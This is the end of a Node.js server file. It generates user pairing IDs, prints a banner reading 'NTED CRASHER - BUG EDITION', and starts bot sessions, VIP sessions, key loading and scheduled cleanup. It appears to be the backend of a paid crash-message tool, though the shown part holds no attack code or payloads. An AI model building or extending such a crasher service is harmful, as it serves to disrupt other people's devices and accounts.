    let changed = false;

    for (const user of db) {
      if (!user.pairId) {
        user.pairId = genPairId();
        changed = true;
        console.log(`[STARTUP] pairId generated: ${user.username} → ${user.pairId}`);
      }
    }

    if (changed) {
      saveDatabase(db);
      const count = db.filter(u => u.pairId).length;
      console.log(`[STARTUP] pairId generation done for ${count} users`);
    } else {
      console.log(`[STARTUP] All users already have pairId`);
    }
  } catch (e) {
    console.error('[STARTUP] pairId generation error:', e);
  }
})();

const red = "\x1b[31m";
const green = "\x1b[32m";
const cyan = "\x1b[36m";
const reset = "\x1b[0m";

console.clear();
console.log(`${red} _   _ _______ ______   _____  _____  ${reset}`);
console.log(`${red}| \\ | |__   __|  ____| |  __ \\|  __ \\ ${reset}`);
console.log(`${red}|  \\| |  | |  | |__    | |  | | |  | |${reset}`);
console.log(`${red}| . \` |  | |  |  __|   | |  | | |  | |${reset}`);
console.log(`${red}| |\\  |  | |  | |____  | |__| | |__| |${reset}`);
console.log(`${red}|_| \\_|  |_|  |______| |_____/|_____/ ${reset}`);
console.log(`${green}  NTED CRASHER - BUG EDITION   ${reset}`);

scheduleAutoBackup(bot, Ntod);
loadActiveKeysFromFile();

app.listen(PORT, "0.0.0.0", () => {
  console.log(`🚀 Server aktif di https://xeternalzsrvrnew.miunnst.site:${PORT}`);
  startVipSessions();
  startUserSessions();

  console.log(`[AUTO REFRESH] Diatur setiap 30 menit sekali.`);
  setInterval(autoRefresh, WakTuMenit);
  console.log(`[AUTOCLEAN LOGS] Diatur setiap jam 12 malam WIB.`);
  scheduleAutoClean();
});